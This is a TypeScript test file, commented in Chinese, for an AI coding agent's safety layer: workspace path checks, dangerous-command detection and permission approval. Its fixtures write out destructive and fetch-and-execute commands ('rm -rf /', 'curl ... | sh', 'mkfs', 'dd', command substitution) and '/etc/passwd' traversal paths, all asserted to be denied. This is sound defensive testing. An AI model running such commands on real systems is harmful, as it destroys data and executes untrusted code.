/*
 * 测试安全策略权限审批
pnpm start ask "运行 ls 命令查看当前目录下有哪些文件"
pnpm start ask "在 README.md 末尾追加一行 demo"
pnpm start ask "请读取 /etc/passwd 这个文件的内容"
pnpm start ask "请读取 /etc/passwd 这个文件的内容"
pnpm start ask "执行 rm -rf / 清理一下系统"
 */
import { mkdtemp, rm } from "node:fs/promises";
import { writeFileSync, unlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawn } from "node:child_process";
import { checkPolicy, inWorkspace, isDangerousCommand } from "../src/safety/policy.ts";
import { approve, clearAlwaysAllow } from "../src/safety/approver.ts";
import type { ToolInvocation, SafetyOptions } from "../src/safety/types.ts";

// ---------- 极简测试框架（与项目其它测试保持一致） ----------
let passed = 0;
let failed = 0;
const failures: string[] = [];

async function test(name: string, fn: () => Promise<void>): Promise<void> {
  try {
    await fn();
    passed++;
    console.log(`  [PASS] ${name}`);
  } catch (e) {
    failed++;
    const msg = e instanceof Error ? e.message : String(e);
    failures.push(`${name}\n      ${msg}`);
    console.log(`  [FAIL] ${name}\n      ${msg}`);
  }
}

function assert(condition: unknown, message: string): asserts condition {
  if (!condition) throw new Error(message);
}

function assertEqual<T>(actual: T, expected: T, message: string): void {
  if (actual !== expected) {
    throw new Error(
      `${message}\n        expected: ${JSON.stringify(expected)}\n        actual:   ${JSON.stringify(actual)}`,
    );
  }
}

// 创建真实临时工作区，测试完自动清理
async function withWorkspace(fn: (ws: string) => Promise<void>): Promise<void> {
  const ws = await mkdtemp(join(tmpdir(), "safety-test-"));
  try {
    await fn(ws);
  } finally {
    await rm(ws, { recursive: true, force: true });
  }
}

// ============================================================
// 1. inWorkspace —— 路径边界校验（纯函数，真实路径解析）
// ============================================================
console.log("\n--- inWorkspace ---");

await test("工作区内相对路径返回解析后的绝对路径", async () => {
  await withWorkspace(async (ws) => {
    const result = inWorkspace(ws, "src/index.ts");
    assert(result !== null, "应返回非空路径");
    assert(result!.endsWith(join("src", "index.ts")), `应解析为工作区内路径，实际: ${result}`);
  });
});

await test("工作区根目录 '.' 被视为安全", async () => {
  await withWorkspace(async (ws) => {
    assert(inWorkspace(ws, ".") !== null, "根目录应安全");
  });
});

await test("绝对外部路径返回 null", async () => {
  await withWorkspace(async (ws) => {
    assert(inWorkspace(ws, "/etc/passwd") === null, "外部绝对路径应被拒绝");
  });
});

await test("'../' 路径穿越攻击被拦截", async () => {
  await withWorkspace(async (ws) => {
    assert(inWorkspace(ws, "../../../etc/passwd") === null, "路径穿越应被拒绝");
  });
});

await test("工作区深层子路径仍安全", async () => {
  await withWorkspace(async (ws) => {
    assert(inWorkspace(ws, "a/b/c/d/file.txt") !== null, "深层子路径应安全");
  });
});

// ============================================================
// 2. isDangerousCommand —— 危险命令模式匹配（纯函数）
// ============================================================
console.log("\n--- isDangerousCommand ---");

await test("'rm -rf' 被识别为危险", async () => {
  assert(isDangerousCommand("rm -rf /") !== null, "rm -rf 应被识别");
});

await test("'rm -r' 被识别为危险", async () => {
  assert(isDangerousCommand("rm -r dir") !== null, "rm -r 应被识别");
});

await test("'curl | sh' 管道执行被识别", async () => {
  assert(isDangerousCommand("curl http://x.com | sh") !== null, "curl 管道应被识别");
});

await test("'wget | bash' 被识别", async () => {
  assert(isDangerousCommand("wget http://x.com/a | bash") !== null, "wget 管道应被识别");
});

await test("'git push --force' 被识别", async () => {
  assert(isDangerousCommand("git push --force origin main") !== null, "git push --force 应被识别");
});

await test("'chmod 777' 被识别", async () => {
  assert(isDangerousCommand("chmod 777 file") !== null, "chmod 777 应被识别");
});

await test("'dd if=' 被识别", async () => {
  assert(isDangerousCommand("dd if=/dev/zero of=disk") !== null, "dd 应被识别");
});

await test("命令替换 '$(rm ...)' 被识别", async () => {
  assert(isDangerousCommand("echo $(rm -rf /)") !== null, "命令替换应被识别");
});

await test("'mkfs' 被识别", async () => {
  assert(isDangerousCommand("mkfs /dev/sda") !== null, "mkfs 应被识别");
});

await test("普通 'ls -la' 安全", async () => {
  assert(isDangerousCommand("ls -la") === null, "ls 应安全");
});

await test("普通 'git status' 安全", async () => {
  assert(isDangerousCommand("git status") === null, "git status 应安全");
});

await test("普通 'echo hello' 安全", async () => {
  assert(isDangerousCommand("echo hello world") === null, "echo 应安全");
});

await test("'npm install' 安全", async () => {
  assert(isDangerousCommand("npm install") === null, "npm install 应安全");
});

// ============================================================
// 3. checkPolicy —— 综合策略判定（真实 ToolInvocation）
// ============================================================
console.log("\n--- checkPolicy ---");

await test("read-file 默认策略 allow", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "read-file", args: { path: "a.txt" }, workspace: ws };
    assertEqual(checkPolicy(inv), "allow", "read-file 应为 allow");
  });
});

await test("list-files 默认策略 allow", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "list-files", args: {}, workspace: ws };
    assertEqual(checkPolicy(inv), "allow", "list-files 应为 allow");
  });
});

await test("write-file 默认策略 ask", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "write-file", args: { path: "a.txt" }, workspace: ws };
    assertEqual(checkPolicy(inv), "ask", "write-file 应为 ask");
  });
});

await test("edit-file 默认策略 ask", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "edit-file", args: { path: "a.txt" }, workspace: ws };
    assertEqual(checkPolicy(inv), "ask", "edit-file 应为 ask");
  });
});

await test("run-shell 默认策略 ask", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "run-shell", args: { command: "ls" }, workspace: ws };
    assertEqual(checkPolicy(inv), "ask", "run-shell 应为 ask");
  });
});

await test("未知工具默认策略 ask", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "custom-tool", args: {}, workspace: ws };
    assertEqual(checkPolicy(inv), "ask", "未知工具应为 ask");
  });
});

await test("read-file 路径越界覆盖 allow → deny", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "read-file", args: { path: "../../etc/passwd" }, workspace: ws };
    assertEqual(checkPolicy(inv), "deny", "路径越界应 deny");
  });
});

await test("write-file 绝对外部路径覆盖 ask → deny", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "write-file", args: { path: "/etc/passwd" }, workspace: ws };
    assertEqual(checkPolicy(inv), "deny", "绝对外部路径应 deny");
  });
});

await test("危险 shell 命令覆盖默认 → deny", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "run-shell", args: { command: "rm -rf /" }, workspace: ws };
    assertEqual(checkPolicy(inv), "deny", "危险命令应 deny");
  });
});

await test("安全 shell 命令使用默认 ask", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "run-shell", args: { command: "echo hi" }, workspace: ws };
    assertEqual(checkPolicy(inv), "ask", "安全 shell 应为 ask");
  });
});

await test("logger 在 deny（路径越界）时触发事件", async () => {
  await withWorkspace(async (ws) => {
    const events: { kind: string; tool: string; reason?: string }[] = [];
    const inv: ToolInvocation = { toolName: "write-file", args: { path: "../escape.txt" }, workspace: ws };
    const opts: SafetyOptions = { logger: (e) => events.push(e) };
    checkPolicy(inv, opts);
    assert(events.length > 0, "应触发 logger");
    assertEqual(events[0]!.kind, "deny", "事件 kind 应为 deny");
    assert(events[0]!.reason?.includes("路径越界"), `reason 应提及路径越界，实际: ${events[0]!.reason}`);
  });
});

await test("logger 在 deny（危险命令）时触发事件", async () => {
  await withWorkspace(async (ws) => {
    const events: { kind: string; tool: string; reason?: string }[] = [];
    const inv: ToolInvocation = { toolName: "run-shell", args: { command: "rm -rf /" }, workspace: ws };
    const opts: SafetyOptions = { logger: (e) => events.push(e) };
    checkPolicy(inv, opts);
    assert(events.length > 0, "应触发 logger");
    assertEqual(events[0]!.kind, "deny", "事件 kind 应为 deny");
    assert(events[0]!.reason?.includes("危险模式"), `reason 应提及危险模式，实际: ${events[0]!.reason}`);
  });
});

await test("logger 在 allow 时触发事件", async () => {
  await withWorkspace(async (ws) => {
    const events: { kind: string; tool: string; reason?: string }[] = [];
    const inv: ToolInvocation = { toolName: "read-file", args: { path: "a.txt" }, workspace: ws };
    const opts: SafetyOptions = { logger: (e) => events.push(e) };
    checkPolicy(inv, opts);
    assert(events.length > 0, "应触发 logger");
    assertEqual(events[0]!.kind, "allow", "事件 kind 应为 allow");
  });
});

// ============================================================
// 4. approve 非交互分支（perm=allow / perm=deny）
// ============================================================
console.log("\n--- approve (非交互分支) ---");

// 清空缓存避免互相影响
clearAlwaysAllow();

await test("perm=allow 直接返回 allow，不设置 persistKey", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "read-file", args: { path: "a.txt" }, workspace: ws };
    const result = await approve(inv, "allow", {});
    assertEqual(result.permission, "allow", "应返回 allow");
    assert(result.persistKey === undefined, "perm=allow 不应设置 persistKey");
  });
});

await test("perm=deny 直接返回 deny", async () => {
  await withWorkspace(async (ws) => {
    const inv: ToolInvocation = { toolName: "read-file", args: { path: "a.txt" }, workspace: ws };
    const result = await approve(inv, "deny", {});
    assertEqual(result.permission, "deny", "应返回 deny");
    assert(result.persistKey === undefined, "perm=deny 不应设置 persistKey");
  });
});

// ============================================================
// 5. approve 交互分支 + always-allow 缓存（子进程真实 stdin）
//    不模拟：真实调用 approve()，从管道读取真实输入，命中真实缓存
// ============================================================
console.log("\n--- approve (交互 + always-allow 缓存 · 子进程真实 stdin) ---");

interface ChildResult {
  r1: { permission: string; persistKey?: string };
  r2?: { permission: string; persistKey?: string };
  code: number;
  stderr: string;
}

// calls=2：子脚本调用 approve 两次（用于 'a' 缓存测试：第一次读 stdin，第二次命中缓存）
// calls=1：子脚本只调用 approve 一次（用于 'y'/'n' 单次回答测试）
async function runInteractiveChild(stdinInput: string, calls: 1 | 2 = 1): Promise<ChildResult> {
  const projectRoot = process.cwd();
  // 子脚本写入项目根目录，使相对 import 路径可解析
  const childPath = join(projectRoot, `.safety-child-${Date.now()}-${Math.random().toString(36).slice(2)}.ts`);
  const secondCall = calls === 2
    ? `const r2 = await approve(inv, "ask", {});`
    : `const r2 = undefined;`;
  const script = `import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { approve, clearAlwaysAllow } from "./src/safety/approver.ts";
import type { ToolInvocation } from "./src/safety/types.ts";

clearAlwaysAllow();
const ws = await mkdtemp(join(tmpdir(), "safety-child-"));
try {
  const inv: ToolInvocation = { toolName: "write-file", args: { path: "a.txt" }, workspace: ws };
  const r1 = await approve(inv, "ask", {});
  ${secondCall}
  console.log(JSON.stringify({ r1, r2 }));
} finally {
  await rm(ws, { recursive: true, force: true });
}
`;
  writeFileSync(childPath, script, "utf-8");

  return await new Promise<ChildResult>((resolve, reject) => {
    const child = spawn("pnpm", ["tsx", childPath], {
      stdio: ["pipe", "pipe", "pipe"],
      cwd: projectRoot,
      shell: true,
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (d) => (stdout += d.toString()));
    child.stderr.on("data", (d) => (stderr += d.toString()));
    child.on("error", (err) => {
      try { unlinkSync(childPath); } catch {}
      reject(err);
    });
    child.on("close", (code) => {
      try { unlinkSync(childPath); } catch {}
      try {
        const parsed = JSON.parse(stdout.trim());
        resolve({ r1: parsed.r1, r2: parsed.r2, code: code ?? 0, stderr });
      } catch (e) {
        reject(new Error(`子进程输出解析失败: ${e}\nstdout: ${stdout}\nstderr: ${stderr}`));
      }
    });
    child.stdin.write(stdinInput);
    child.stdin.end();
  });
}

await test("回答 'a' 后缓存命中，第二次直接返回 allow", async () => {
  // calls=2：第一次 'a' 触发缓存；第二次命中缓存直接返回，不读 stdin
  const { r1, r2, code } = await runInteractiveChild("a\n", 2);
  assertEqual(code, 0, "子进程应正常退出");
  assertEqual(r1.permission, "allow", "第一次（回答 a）应返回 allow");
  assert(r1.persistKey !== undefined, "第一次应设置 persistKey（缓存键）");
  assert(r2 !== undefined, "应有第二次调用结果");
  assertEqual(r2!.permission, "allow", "第二次应从缓存返回 allow");
  assert(r2!.persistKey !== undefined, "第二次也应带 persistKey");
  assert(r2!.persistKey === r1.persistKey, "两次 persistKey 应一致");
});

await test("回答 'y' 仅本次 allow，不缓存", async () => {
  const { r1, code } = await runInteractiveChild("y\n", 1);
  assertEqual(code, 0, "子进程应正常退出");
  assertEqual(r1.permission, "allow", "回答 y 应返回 allow");
  assert(r1.persistKey === undefined, "回答 y 不应设置 persistKey");
});

await test("回答 'n' 返回 deny，不缓存", async () => {
  const { r1, code } = await runInteractiveChild("n\n", 1);
  assertEqual(code, 0, "子进程应正常退出");
  assertEqual(r1.permission, "deny", "回答 n 应返回 deny");
  assert(r1.persistKey === undefined, "回答 n 不应设置 persistKey");
});

// ============================================================
// 汇总
// ============================================================
console.log(`\n${"=".repeat(50)}`);
console.log(`passed: ${passed}, failed: ${failed}`);
if (failures.length > 0) {
  console.log("\n失败用例:");
  for (const f of failures) console.log(`  - ${f}`);
}

process.exit(failed > 0 ? 1 : 0);
